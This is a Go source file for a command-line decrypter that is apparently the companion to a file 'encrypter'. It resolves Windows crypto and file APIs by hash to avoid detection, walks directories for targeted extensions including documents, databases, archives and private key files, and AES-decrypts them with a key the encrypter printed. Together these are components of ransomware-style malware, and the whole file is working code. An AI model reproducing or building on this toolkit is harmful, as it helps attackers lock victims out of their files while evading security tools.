// this file contains the decrypter cli, it expects a hex string key that was printed after the execution of the encrypter,
// and a path to the directory that was encrypted. 

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"strings"
	"unsafe"
	"unicode/utf16"
	wc "github.com/carved4/go-wincall"
)

var (
	bcryptBase                   uintptr = wc.LoadLibraryLdr("bcrypt.dll")
	bCryptSetProperty            uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptSetProperty"))
	bCryptOpenAlgorithmProvider  uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptOpenAlgorithmProvider"))
	bCryptGenerateSymmetricKey   uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptGenerateSymmetricKey"))
	bCryptDestroyKey             uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptDestroyKey"))
	bCryptGetProperty            uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptGetProperty"))
	bCryptDecryptAddr            uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptDecrypt"))
	bCryptEncrypt                uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptEncrypt"))
	bCryptCloseAlgorithmProvider uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptCloseAlgorithmProvider"))
	k32Base                      uintptr = wc.GetModuleBase(wc.GetHash("kernel32.dll"))
	readFileAddr                 uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("ReadFile"))
	createFileAddr               uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("CreateFileW"))
	closeHandleAddr              uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("CloseHandle"))
	getFileSizeAddr              uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("GetFileSize"))
	getLastErrorAddr             uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("GetLastError"))
	bCryptGenRandom              uintptr = wc.GetFunctionAddress(bcryptBase, wc.GetHash("BCryptGenRandom"))
	writeFileAddr                uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("WriteFile"))
	findFirstFileAddr            uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("FindFirstFileW"))
	findNextFileAddr             uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("FindNextFileW"))
	findCloseAddr                uintptr = wc.GetFunctionAddress(k32Base, wc.GetHash("FindClose"))
)

const (
	BCRYPT_AES_ALGORITHM            = "AES"
	BCRYPT_CHAINING_MODE            = "ChainingMode"
	BCRYPT_CHAIN_MODE_CBC           = "ChainingModeCBC"
	BCRYPT_OBJECT_LENGTH            = "ObjectLength"
	BCRYPT_BLOCK_LENGTH             = "BlockLength"
	BCRYPT_BLOCK_PADDING            = 0x00000001
	BCRYPT_USE_SYSTEM_PREFERRED_RNG = 0x00000002
	FILE_ATTRIBUTE_DIRECTORY        = 0x10
	INVALID_HANDLE_VALUE            = ^uintptr(0)
)

type BCryptHandle uintptr

type WIN32_FIND_DATAW struct {
	DwFileAttributes   uint32
	FtCreationTime     [8]byte
	FtLastAccessTime   [8]byte
	FtLastWriteTime    [8]byte
	NFileSizeHigh      uint32
	NFileSizeLow       uint32
	DwReserved0        uint32
	DwReserved1        uint32
	CFileName          [260]uint16
	CAlternateFileName [14]uint16
}

func main() {
	var key = flag.String("key", "", "-key <hex key>")
	var path = flag.String("path", "", "-path <C://path//path>")
	flag.Parse()
	
	if *key == "" {
		fmt.Printf("please provide a key\n")
		return
	}
	if *path == "" {
		fmt.Printf("please provide a path\n")
		return
	}
	
	paths := getPaths(*path)
	fmt.Printf("found %d files to decrypt\n", len(paths))
	for _, p := range paths {
		if err := decryptFile(p, *key); err != nil {
			fmt.Printf("failed to decrypt %s: %v\n", p, err)
		} else {
			fmt.Printf("decrypted: %s\n", p)
		}
	}
	fmt.Println("decryption complete!")
}


func decryptFile(filePath string, key string) error {
	var hAlg BCryptHandle
	var hKey BCryptHandle

	utf16ptr, _ := wc.UTF16ptr(BCRYPT_AES_ALGORITHM)
	ret, _, _ := wc.CallG0(
		bCryptOpenAlgorithmProvider,
		uintptr(unsafe.Pointer(&hAlg)),
		uintptr(unsafe.Pointer(utf16ptr)),
		0,
		0,
	)
	if ret != 0 {
		return fmt.Errorf("BCryptOpenAlgorithmProvider failed: 0x%x", ret)
	}
	defer wc.CallG0(bCryptCloseAlgorithmProvider, uintptr(hAlg), 0)

	cbcMode, _ := wc.UTF16ptr(BCRYPT_CHAIN_MODE_CBC)
	chainingMode, _ := wc.UTF16ptr(BCRYPT_CHAINING_MODE)
	ret, _, _ = wc.CallG0(
		bCryptSetProperty,
		uintptr(hAlg),
		uintptr(unsafe.Pointer(chainingMode)),
		uintptr(unsafe.Pointer(cbcMode)),
		uintptr(len(BCRYPT_CHAIN_MODE_CBC)*2),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("BCryptSetProperty failed: 0x%x", ret)
	}

	var cbKeyObject uint32
	var cbData uint32
	objLen, _ := wc.UTF16ptr(BCRYPT_OBJECT_LENGTH)
	ret, _, _ = wc.CallG0(
		bCryptGetProperty,
		uintptr(hAlg),
		uintptr(unsafe.Pointer(objLen)),
		uintptr(unsafe.Pointer(&cbKeyObject)),
		4,
		uintptr(unsafe.Pointer(&cbData)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("BCryptGetProperty (object length) failed: 0x%x", ret)
	}

	pbKeyObject := make([]byte, cbKeyObject)

	var cbBlockLen uint32
	blockLen, _ := wc.UTF16ptr(BCRYPT_BLOCK_LENGTH)
	ret, _, _ = wc.CallG0(
		bCryptGetProperty,
		uintptr(hAlg),
		uintptr(unsafe.Pointer(blockLen)),
		uintptr(unsafe.Pointer(&cbBlockLen)),
		4,
		uintptr(unsafe.Pointer(&cbData)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("BCryptGetProperty (block length) failed: 0x%x", ret)
	}
	keyBytes, err := hex.DecodeString(key)
	if err != nil {
		return fmt.Errorf("failed to decode hex key: %v", err)
	}
	if len(keyBytes) == 0 {
		return fmt.Errorf("key is empty after decoding")
	}
	ret, _, _ = wc.CallG0(
		bCryptGenerateSymmetricKey,
		uintptr(hAlg),
		uintptr(unsafe.Pointer(&hKey)),
		uintptr(unsafe.Pointer(&pbKeyObject[0])),
		uintptr(cbKeyObject),
		uintptr(unsafe.Pointer(&keyBytes[0])),
		uintptr(len(keyBytes)),
		0,
	)
	if ret != 0 {
		return fmt.Errorf("BCryptGenerateSymmetricKey failed: 0x%x", ret)
	}
	defer wc.CallG0(bCryptDestroyKey, uintptr(hKey))

	encryptedData := readFile(filePath)
	if encryptedData == nil || len(encryptedData) <= int(cbBlockLen) {
		return fmt.Errorf("failed to read file or file too small")
	}
	defer func() {
		for i := range encryptedData {
			encryptedData[i] = 0
		}
	}()

	pbIV := make([]byte, cbBlockLen)
	copy(pbIV, encryptedData[:cbBlockLen])
	pbInput := encryptedData[cbBlockLen:]
	const maxChunkSize = 256 * 1024 * 1024
	chunkSize := maxChunkSize - (maxChunkSize % int(cbBlockLen))
	
	if len(pbInput) <= chunkSize {
		var cbOutput uint32
		ret, _, _ = wc.CallG0(
			bCryptDecryptAddr,
			uintptr(hKey),
			uintptr(unsafe.Pointer(&pbInput[0])),
			uintptr(uint32(len(pbInput))),
			0,
			uintptr(unsafe.Pointer(&pbIV[0])),
			uintptr(cbBlockLen),
			0,
			0,
			uintptr(unsafe.Pointer(&cbOutput)),
			BCRYPT_BLOCK_PADDING,
		)
		if ret != 0 {
			return fmt.Errorf("BCryptDecrypt (size) failed: 0x%x", ret)
		}

		pbOutput := make([]byte, cbOutput)
		defer func() {
			for i := range pbOutput {
				pbOutput[i] = 0
			}
		}()

		ret, _, _ = wc.CallG0(
			bCryptDecryptAddr,
			uintptr(hKey),
			uintptr(unsafe.Pointer(&pbInput[0])),
			uintptr(uint32(len(pbInput))),
			0,
			uintptr(unsafe.Pointer(&pbIV[0])),
			uintptr(cbBlockLen),
			uintptr(unsafe.Pointer(&pbOutput[0])),
			uintptr(cbOutput),
			uintptr(unsafe.Pointer(&cbData)),
			BCRYPT_BLOCK_PADDING,
		)
		if ret != 0 {
			return fmt.Errorf("BCryptDecrypt failed: 0x%x", ret)
		}

		utf16Path, _ := wc.UTF16ptr(filePath)
		fHandle, _, _ := wc.CallG0(
			createFileAddr,
			utf16Path,
			0x40000000,
			0,
			0,
			2,
			0x80,
			0,
		)
		if fHandle == 0 || fHandle == ^uintptr(0) {
			return fmt.Errorf("failed to open file for writing")
		}
		defer wc.CallG0(closeHandleAddr, fHandle)

		var bytesWritten uint32
		ret, _, _ = wc.CallG0(
			writeFileAddr,
			fHandle,
			uintptr(unsafe.Pointer(&pbOutput[0])),
			uintptr(cbData),
			uintptr(unsafe.Pointer(&bytesWritten)),
			0,
		)
		if ret == 0 || bytesWritten != cbData {
			return fmt.Errorf("failed to write decrypted data: wrote %d of %d bytes", bytesWritten, cbData)
		}

		return nil
	}

	var allOutput []byte
	offset := 0
	
	for offset < len(pbInput) {
		remainingSize := len(pbInput) - offset
		currentChunkSize := chunkSize
		isLastChunk := false
		
		if remainingSize <= chunkSize {
			currentChunkSize = remainingSize
			isLastChunk = true
		}
		
		chunk := pbInput[offset : offset+currentChunkSize]
		
		var flags uintptr = 0
		if isLastChunk {
			flags = BCRYPT_BLOCK_PADDING
		}
		
		var cbOutput uint32
		ret, _, _ = wc.CallG0(
			bCryptDecryptAddr,
			uintptr(hKey),
			uintptr(unsafe.Pointer(&chunk[0])),
			uintptr(uint32(len(chunk))),
			0,
			uintptr(unsafe.Pointer(&pbIV[0])),
			uintptr(cbBlockLen),
			0,
			0,
			uintptr(unsafe.Pointer(&cbOutput)),
			flags,
		)
		if ret != 0 {
			return fmt.Errorf("BCryptDecrypt (size) failed on chunk at offset %d: 0x%x", offset, ret)
		}
		
		pbOutput := make([]byte, cbOutput)
		
		ret, _, _ = wc.CallG0(
			bCryptDecryptAddr,
			uintptr(hKey),
			uintptr(unsafe.Pointer(&chunk[0])),
			uintptr(uint32(len(chunk))),
			0,
			uintptr(unsafe.Pointer(&pbIV[0])),
			uintptr(cbBlockLen),
			uintptr(unsafe.Pointer(&pbOutput[0])),
			uintptr(cbOutput),
			uintptr(unsafe.Pointer(&cbData)),
			flags,
		)
		if ret != 0 {
			return fmt.Errorf("BCryptDecrypt failed on chunk at offset %d: 0x%x", offset, ret)
		}
		

		allOutput = append(allOutput, pbOutput[:cbData]...)
		
		for i := range pbOutput {
			pbOutput[i] = 0
		}
		
		offset += currentChunkSize
	}
	
	defer func() {
		for i := range allOutput {
			allOutput[i] = 0
		}
	}()

	utf16Path, _ := wc.UTF16ptr(filePath)
	fHandle, _, _ := wc.CallG0(
		createFileAddr,
		utf16Path,
		0x40000000, // GENERIC_WRITE
		0,
		0,
		2,    // CREATE_ALWAYS (truncates if exists)
		0x80, // FILE_ATTRIBUTE_NORMAL
		0,
	)
	if fHandle == 0 || fHandle == ^uintptr(0) {
		return fmt.Errorf("failed to open file for writing")
	}
	defer wc.CallG0(closeHandleAddr, fHandle)

	var bytesWritten uint32
	ret, _, _ = wc.CallG0(
		writeFileAddr,
		fHandle,
		uintptr(unsafe.Pointer(&allOutput[0])),
		uintptr(len(allOutput)),
		uintptr(unsafe.Pointer(&bytesWritten)),
		0,
	)
	if ret == 0 || bytesWritten != uint32(len(allOutput)) {
		return fmt.Errorf("failed to write decrypted data: wrote %d of %d bytes", bytesWritten, len(allOutput))
	}

	return nil
}
func getPaths(rootDir string) []string {
	var paths []string
	targetExtensions := map[string]bool{
		".txt":    true,
		".csv":    true,
		".xlsx":   true,
		".pdf":    true,
		".docx":   true,
		".rtf":    true,
		".sqlite": true,
		".db":     true,
		".zip":    true,
		".tar":    true,
		".mp4":    true,
		".tar.gz": true, 
		".bin": true, 
		".pem": true, 
		".key": true, 
		".pub": true, 
	}
	var walkDir func(string)
	walkDir = func(dir string) {
		searchPath := dir + "\\*"
		utf16Path, _ := wc.UTF16ptr(searchPath)

		var findData WIN32_FIND_DATAW
		hFind, _, _ := wc.CallG0(
			findFirstFileAddr,
			utf16Path,
			uintptr(unsafe.Pointer(&findData)),
		)

		if hFind == INVALID_HANDLE_VALUE {
			return
		}
		defer wc.CallG0(findCloseAddr, hFind)

		for {
		
			fileName := utf16ToString(findData.CFileName[:])

	
			if fileName == "." || fileName == ".." {
				ret, _, _ := wc.CallG0(
					findNextFileAddr,
					hFind,
					uintptr(unsafe.Pointer(&findData)),
				)
				if ret == 0 {
					break
				}
				continue
			}

			fullPath := dir + "\\" + fileName

	
			if findData.DwFileAttributes&FILE_ATTRIBUTE_DIRECTORY != 0 {

				walkDir(fullPath)
			} else {

				lowerFileName := strings.ToLower(fileName)
				for ext := range targetExtensions {
					if strings.HasSuffix(lowerFileName, ext) {
						paths = append(paths, fullPath)
						break
					}
				}
			}

	
			ret, _, _ := wc.CallG0(
				findNextFileAddr,
				hFind,
				uintptr(unsafe.Pointer(&findData)),
			)
			if ret == 0 {
				break
			}
		}
	}

	walkDir(rootDir)
	return paths
}


func utf16ToString(s []uint16) string {
	for i, v := range s {
		if v == 0 {
			return string(utf16.Decode(s[:i]))
		}
	}
	return ""
}

func readFile(path string) []byte {
	utf16Path, _ := wc.UTF16ptr(path)
	fHandle, _, _ := wc.CallG0(
		createFileAddr,
		utf16Path,
		0x80000000, // GENERIC_READ
		0x00000001 | 0x00000002, // FILE_SHARE_READ | FILE_SHARE_WRITE
		0,
		3,          // OPEN_EXISTING
		0x08000080, // FILE_FLAG_SEQUENTIAL_SCAN | FILE_ATTRIBUTE_NORMAL
		0,
	)
	defer wc.CallG0(closeHandleAddr, fHandle)
	if fHandle == 0 || fHandle == ^uintptr(0) {
		lastErr, _, _ := wc.CallG0(getLastErrorAddr)
		fmt.Printf("failed to open file: error 0x%x\n", lastErr)
		return nil
	}
	

	var fileSizeHigh uint32
	fSizeLow, _, _ := wc.CallG0(getFileSizeAddr, fHandle, uintptr(unsafe.Pointer(&fileSizeHigh)))
	if fSizeLow == 0xFFFFFFFF {
		err, _, _ := wc.CallG0(getLastErrorAddr)
		if err != 0 {
			fmt.Printf("failed to get size of file: error 0x%x\n", err)
			return nil
		}
	}

	fSize := uint64(fileSizeHigh)<<32 | uint64(fSizeLow)
	if fSize == 0 {
		fmt.Printf("file is empty\n")
		return nil
	}
	

	const maxFileSize = 2 * 1024 * 1024 * 1024 
	if fSize > maxFileSize {
		fmt.Printf("file too large: %d bytes (max %d bytes)\n", fSize, maxFileSize)
		return nil
	}
	
	buffer := make([]byte, fSize)
	

	const maxReadSize = 64 * 1024 * 1024
	var totalBytesRead uint64 = 0
	var overlapped uintptr = 0
	
	for totalBytesRead < fSize {
		remaining := fSize - totalBytesRead
		readSize := uint32(maxReadSize)
		if uint64(readSize) > remaining {
			readSize = uint32(remaining)
		}
		
		var bytesRead uint32
		ret, _, _ := wc.CallG0(
			readFileAddr,
			fHandle,
			uintptr(unsafe.Pointer(&buffer[totalBytesRead])),
			uintptr(readSize),
			uintptr(unsafe.Pointer(&bytesRead)),
			overlapped,
		)
		
		if ret == 0 {
			err, _, _ := wc.CallG0(getLastErrorAddr)
			fmt.Printf("ReadFile failed at offset %d: err=0x%x\n", totalBytesRead, err)
			return nil
		}
		
		if bytesRead == 0 {
			fmt.Printf("ReadFile returned 0 bytes at offset %d (expected %d more bytes)\n", totalBytesRead, remaining)
			return nil
		}
		
		totalBytesRead += uint64(bytesRead)
	}
	
	return buffer
}